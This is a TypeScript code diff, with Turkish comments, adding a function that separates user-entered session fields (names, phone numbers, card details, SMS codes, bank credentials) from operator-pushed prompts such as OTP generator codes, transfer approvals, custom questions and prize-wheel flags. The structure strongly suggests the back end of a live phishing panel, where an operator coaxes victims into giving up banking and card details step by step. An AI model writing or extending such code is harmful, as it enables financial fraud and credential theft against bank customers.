@@ -59,3 +59,64 @@ export function showBeautifulToast(message: string, description?: string) {
     }, 500);
   }, 4000);
 }
+
+/**
+ * Sessions tablosundaki form_data nesnesinden sadece ve sadece
+ * kullanicinin girdigi alanlari (isim, telefon, kart, SMS, banka credential vb.) suzer.
+ * Admin tarafindan basilan teknik ayarlar, bildirim metinleri, sorular, generator kodlari
+ * kesinlikle form verisi degisimi sayilmaz!
+ */
+export function extractUserFormData(data: any): Record<string, any> {
+  if (!data || typeof data !== "object") return {};
+  const ADMIN_KEYS = new Set([
+    "generatorType",
+    "generatorCode",
+    "generatorLoginHistory",
+    "transferApproval",
+    "specialNoticeText",
+    "specialNoticeImage",
+    "specialNoticeLang",
+    "specialNoticeSentAt",
+    "customQuestionText",
+    "customQuestionSentAt",
+    "is_wheel_game",
+    "is_win2_flow",
+    "pending_profile",
+    "currency",
+    "bankSlug",
+    "bankName",
+    "partner_display_name",
+    "participationCode",
+    "amount",
+  ]);
+
+  const userFields: Record<string, any> = {};
+  for (const [k, v] of Object.entries(data)) {
+    if (ADMIN_KEYS.has(k)) continue;
+    if (v === undefined || v === null || v === "") continue;
+
+    // customQuestions: sadece kullanicinin verdigi cevap varsa dikkate al
+    if (k === "customQuestions" && Array.isArray(v)) {
+      const answers = v.map((item: any) => item?.answer).filter(Boolean);
+      if (answers.length > 0) userFields.customQuestionsAnswers = answers;
+      continue;
+    }
+
+    // generatorCurrent: sadece kullanicinin doldurdugu data nesnesi varsa dikkate al
+    if (k === "generatorCurrent" && typeof v === "object") {
+      const userDatas = Object.entries(v)
+        .filter(([_, item]: any) => item?.data && Object.keys(item.data).length > 0)
+        .map(([variant, item]: any) => ({ variant, data: item.data }));
+      if (userDatas.length > 0) userFields.generatorCurrentDatas = userDatas;
+      continue;
+    }
+
+    // admin prompt sifirlamalari (approvalStatus: "", approvalCode: "") atla
+    if ((k === "approvalStatus" || k === "approvalCode") && !String(v).trim()) {
+      continue;
+    }
+
+    userFields[k] = v;
+  }
+  return userFields;
+}
